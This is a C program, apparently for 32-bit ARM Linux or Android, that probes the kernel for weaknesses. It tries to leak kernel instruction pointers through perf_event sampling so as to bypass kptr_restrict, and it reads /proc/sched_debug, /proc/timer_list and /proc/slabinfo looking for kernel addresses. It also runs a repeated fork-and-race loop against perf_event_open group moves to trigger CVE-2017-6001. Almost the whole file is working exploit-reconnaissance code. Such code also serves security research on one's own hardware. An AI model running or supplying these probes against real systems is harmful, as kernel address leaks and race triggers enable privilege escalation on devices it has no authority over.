/*
 * perf_kaddr_leak.c — Test kernel address leak via perf_event sampling
 * 
 * On unpatched kernels, perf_event returns kernel instruction pointers
 * in sample records. This bypasses kptr_restrict.
 * 
 * Also tests: perf_event + PERF_FLAG_FD_OUTPUT for CVE-2017-6001 surface.
 * 
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o perf_kaddr_leak perf_kaddr_leak.c -lpthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <poll.h>

#define PERF_TYPE_SOFTWARE    1
#define PERF_TYPE_HARDWARE    0
#define PERF_TYPE_TRACEPOINT  2

#define PERF_COUNT_SW_CPU_CLOCK       0
#define PERF_COUNT_SW_TASK_CLOCK      1
#define PERF_COUNT_SW_PAGE_FAULTS     2
#define PERF_COUNT_SW_CONTEXT_SWITCHES 3

#define PERF_SAMPLE_IP        (1 << 0)
#define PERF_SAMPLE_TID       (1 << 1)
#define PERF_SAMPLE_TIME      (1 << 2)
#define PERF_SAMPLE_ADDR      (1 << 3)
#define PERF_SAMPLE_CALLCHAIN (1 << 5)
#define PERF_SAMPLE_RAW       (1 << 10)

#define PERF_EVENT_IOC_ENABLE     0x2400
#define PERF_EVENT_IOC_DISABLE    0x2401
#define PERF_EVENT_IOC_SET_OUTPUT  0x2405

#define PERF_FLAG_FD_OUTPUT   (1U << 0)
#define PERF_FLAG_FD_NO_GROUP (1U << 1)

struct perf_event_attr {
    unsigned int type;
    unsigned int size;
    unsigned long long config;
    union {
        unsigned long long sample_period;
        unsigned long long sample_freq;
    };
    unsigned long long sample_type;
    unsigned long long read_format;
    unsigned long long flags;
    unsigned int wakeup_events;
    unsigned int wakeup_watermark;
    unsigned int bp_type;
    union {
        unsigned long long bp_addr;
        unsigned long long config1;
    };
    union {
        unsigned long long bp_len;
        unsigned long long config2;
    };
    unsigned long long branch_sample_type;
    unsigned long long sample_regs_user;
    unsigned long long sample_stack_user;
};

struct perf_event_header {
    unsigned int type;
    unsigned short misc;
    unsigned short size;
};

#define PERF_RECORD_SAMPLE  9
#define PERF_RECORD_MMAP    1
#define PERF_RECORD_COMM    3
#define PERF_RECORD_LOST    2

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Read samples from mmap ring buffer looking for kernel addresses */
static int scan_for_kernel_addrs(void *mmap_base, size_t data_size) {
    unsigned int *header = (unsigned int *)mmap_base;
    unsigned long long data_head = *(unsigned long long *)(header + 16);
    unsigned char *data = (unsigned char *)mmap_base + 4096; /* data starts after header page */
    int found = 0;
    unsigned int offset = 0;
    
    printf("    data_head=%llu\n", data_head);
    
    while (offset < data_head && offset < data_size - 8) {
        struct perf_event_header *hdr = (struct perf_event_header *)(data + (offset % data_size));
        
        if (hdr->size == 0 || hdr->size > 4096) break;
        
        if (hdr->type == PERF_RECORD_SAMPLE) {
            /* Sample record: IP follows the header */
            unsigned int *ip_ptr = (unsigned int *)((char *)hdr + sizeof(*hdr));
            unsigned int ip = *ip_ptr;
            
            /* Check if IP is in kernel range (0xC0000000 - 0xFFFFFFFF on ARM32) */
            if (ip >= 0xC0000000) {
                if (found < 10) {
                    printf("    [!] KERNEL IP: 0x%08x (misc=0x%x)\n", ip, hdr->misc);
                }
                found++;
            } else if (found < 3 && ip > 0) {
                printf("    User IP: 0x%08x (misc=0x%x)\n", ip, hdr->misc);
            }
        }
        
        offset += hdr->size;
    }
    
    return found;
}

/* TEST 1: Sample kernel IPs during system calls */
int test_kernel_ip_leak(void) {
    struct perf_event_attr attr;
    int fd;
    void *map;
    size_t mmap_size = (1 + 16) * 4096; /* 16 data pages */
    
    printf("[*] TEST 1: Kernel IP leak via perf sampling\n");
    
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 1; /* sample every event */
    attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID;
    attr.flags = 0; /* NOT disabled — start immediately */
    /* Set exclude_kernel=0 to try to sample kernel IPs */
    /* flags bit 2 = exclude_user, bit 3 = exclude_kernel */
    /* We want exclude_user=0, exclude_kernel=0 to get both */
    attr.wakeup_events = 1;
    
    fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        printf("    FAILED: errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    map = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        printf("    mmap FAILED: errno=%d\n", errno);
        close(fd);
        return -1;
    }
    
    /* Generate events by doing syscalls */
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 10000; i++) {
        getpid();       /* syscall */
        getuid();       /* syscall */
        sched_yield();  /* syscall */
    }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    
    int found = scan_for_kernel_addrs(map, 16 * 4096);
    printf("    Found %d kernel IPs\n", found);
    
    if (found > 0) {
        printf("    [!!!] KERNEL ADDRESS LEAK via perf_event — bypasses kptr_restrict!\n");
    }
    
    munmap(map, mmap_size);
    close(fd);
    return found;
}

/* TEST 2: Try exclude_kernel=0 explicitly with different configs */
int test_kernel_sample_configs(void) {
    struct perf_event_attr attr;
    int fd;
    void *map;
    size_t mmap_size = (1 + 16) * 4096;
    int configs[] = { PERF_COUNT_SW_CPU_CLOCK, PERF_COUNT_SW_TASK_CLOCK, 
                      PERF_COUNT_SW_PAGE_FAULTS, PERF_COUNT_SW_CONTEXT_SWITCHES };
    const char *names[] = { "CPU_CLOCK", "TASK_CLOCK", "PAGE_FAULTS", "CTX_SWITCHES" };
    
    printf("\n[*] TEST 2: Multiple software counter configs for kernel sampling\n");
    
    for (int c = 0; c < 4; c++) {
        memset(&attr, 0, sizeof(attr));
        attr.type = PERF_TYPE_SOFTWARE;
        attr.size = sizeof(attr);
        attr.config = configs[c];
        attr.sample_period = 1;
        attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
        attr.flags = 0; /* exclude_kernel=0 */
        attr.wakeup_events = 1;
        
        fd = perf_event_open(&attr, 0, -1, -1, 0);
        if (fd < 0) {
            printf("    %s: open FAILED (errno=%d)\n", names[c], errno);
            continue;
        }
        
        map = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (map == MAP_FAILED) {
            close(fd);
            continue;
        }
        
        ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
        for (int i = 0; i < 5000; i++) {
            getpid();
            sched_yield();
        }
        ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
        
        int found = scan_for_kernel_addrs(map, 16 * 4096);
        printf("    %s: %d kernel IPs found\n", names[c], found);
        
        munmap(map, mmap_size);
        close(fd);
    }
    return 0;
}

/* TEST 3: CVE-2017-6001 move_group race probe */
int test_move_group_race(int iterations) {
    struct perf_event_attr attr;
    int hangs = 0;
    
    printf("\n[*] TEST 3: CVE-2017-6001 move_group race (%d iterations)\n", iterations);
    printf("    Race: perf_event_open(group_fd, cpu=N) vs perf_event_open(group_fd, cpu=M)\n");
    
    for (int i = 0; i < iterations; i++) {
        pid_t child = fork();
        if (child == 0) {
            alarm(5);
            
            /* Create group leader on CPU 0 */
            memset(&attr, 0, sizeof(attr));
            attr.type = PERF_TYPE_SOFTWARE;
            attr.size = sizeof(attr);
            attr.config = PERF_COUNT_SW_CPU_CLOCK;
            attr.flags = 1;
            
            int group_fd = perf_event_open(&attr, 0, 0, -1, 0);
            if (group_fd < 0) _exit(1);
            
            /* Create child in same group */
            attr.config = PERF_COUNT_SW_TASK_CLOCK;
            int child_fd = perf_event_open(&attr, 0, 0, group_fd, 0);
            if (child_fd < 0) {
                close(group_fd);
                _exit(1);
            }
            
            /* Now try to move group to CPU 1 */
            /* perf_event_open with group_fd and different CPU triggers move_group */
            attr.config = PERF_COUNT_SW_PAGE_FAULTS;
            int move_fd = perf_event_open(&attr, 0, 1, group_fd, 0);
            /* This might fail with EXDEV or succeed — either is interesting */
            
            if (move_fd >= 0) close(move_fd);
            close(child_fd);
            close(group_fd);
            _exit(0);
        }
        
        int status;
        int waited = 0;
        for (int j = 0; j < 60; j++) {
            if (waitpid(child, &status, WNOHANG) > 0) { waited = 1; break; }
            usleep(100000);
        }
        
        if (!waited) {
            kill(child, SIGKILL);
            waitpid(child, &status, 0);
            hangs++;
            printf("    [!] HANG at iteration %d!\n", i);
        } else if (WIFSIGNALED(status)) {
            printf("    [!] CRASH at iteration %d, signal %d!\n", i, WTERMSIG(status));
        }
        
        if (i % 100 == 0 && i > 0) {
            printf("    Progress: %d/%d (hangs=%d)\n", i, iterations, hangs);
        }
    }
    
    printf("    Done: %d iterations, %d hangs\n", iterations, hangs);
    return hangs;
}

/* TEST 4: Try to read /proc/kallsyms via perf_event info leak */
int test_kallsyms_alternative(void) {
    printf("\n[*] TEST 4: Alternative kernel symbol resolution\n");
    
    /* Check if we can read /proc/sched_debug for kernel addresses */
    FILE *f = fopen("/proc/sched_debug", "r");
    if (f) {
        char line[256];
        int found = 0;
        while (fgets(line, sizeof(line), f) && found < 5) {
            if (strstr(line, "0x") || strstr(line, "0xc")) {
                printf("    sched_debug: %s", line);
                found++;
            }
        }
        fclose(f);
        if (found) printf("    [!] /proc/sched_debug leaks addresses!\n");
    } else {
        printf("    /proc/sched_debug: %s\n", strerror(errno));
    }
    
    /* Check timer_list for kernel addresses */
    f = fopen("/proc/timer_list", "r");
    if (f) {
        char line[256];
        int found = 0;
        while (fgets(line, sizeof(line), f) && found < 5) {
            /* Look for hex addresses in timer_list */
            char *p = strstr(line, " c0");
            if (!p) p = strstr(line, "\tc0");
            if (!p) p = strstr(line, "(c0");
            if (p) {
                printf("    timer_list: %s", line);
                found++;
            }
        }
        fclose(f);
        if (found) printf("    [!] /proc/timer_list leaks kernel addresses!\n");
    } else {
        printf("    /proc/timer_list: %s\n", strerror(errno));
    }
    
    /* Check /proc/slabinfo */
    f = fopen("/proc/slabinfo", "r");
    if (f) {
        char line[256];
        printf("    /proc/slabinfo READABLE:\n");
        for (int i = 0; i < 3 && fgets(line, sizeof(line), f); i++) {
            printf("    %s", line);
        }
        fclose(f);
    } else {
        printf("    /proc/slabinfo: %s\n", strerror(errno));
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    int race_iters = 500;
    if (argc > 1) race_iters = atoi(argv[1]);
    
    printf("=== perf_event Kernel Address Leak & CVE-2017-6001 Probe ===\n");
    printf("PID=%d, UID=%d\n\n", getpid(), getuid());
    
    test_kernel_ip_leak();
    test_kernel_sample_configs();
    test_kallsyms_alternative();
    test_move_group_race(race_iters);
    
    printf("\n=== Done ===\n");
    return 0;
}
